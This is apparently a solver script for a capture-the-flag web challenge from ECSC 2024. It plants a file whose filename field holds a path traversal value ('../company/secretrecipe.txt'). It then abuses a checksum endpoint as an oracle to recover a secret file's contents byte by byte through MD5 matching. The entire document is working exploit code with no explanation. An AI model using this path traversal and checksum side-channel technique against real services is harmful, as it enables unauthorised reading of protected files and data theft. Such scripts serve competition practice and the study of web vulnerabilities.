#!/usr/bin/env python3

import os
import time
import string
import logging
import hashlib
import requests
from uuid import uuid4

logging.disable()

URL = os.environ.get("URL", "http://slurm.challs.open.ecsc2024.it")
if URL.endswith("/"):
    URL = URL[:-1]

BASE_URL = f"{URL}/api/v1"
file_id = str(uuid4())
requests.put(
    f"{BASE_URL}/files/{file_id}",
    json = {
        "author": "challenger",
        "filename": "../company/secretrecipe.txt",
        "description": "exploit",
        "content": "exploit"
    }
)
desired_result = hashlib.md5(b'}').hexdigest()
empty = hashlib.md5(b'').hexdigest()
result = b''
i = 0
f = 200
offset = (i + f) // 2
while True:
    result = requests.get(f"{BASE_URL}/files/{file_id}/checksum?offset={offset}").json()["checksum"]
    if result == desired_result:
        break
    if result == empty:
        f = offset
        offset = (i + f)//2
    else:
        i = offset
        offset = (i + f)//2
flag = "}"
while offset > 0:
    offset -= 1
    desired_result = requests.get(f"{BASE_URL}/files/{file_id}/checksum?offset={offset}").json()["checksum"]
    for c in string.printable:
        tmp_flag = f"{c}{flag}"
        if hashlib.md5(tmp_flag.encode()).hexdigest() == desired_result:
            flag = tmp_flag
            break
    time.sleep(.1)
print(flag)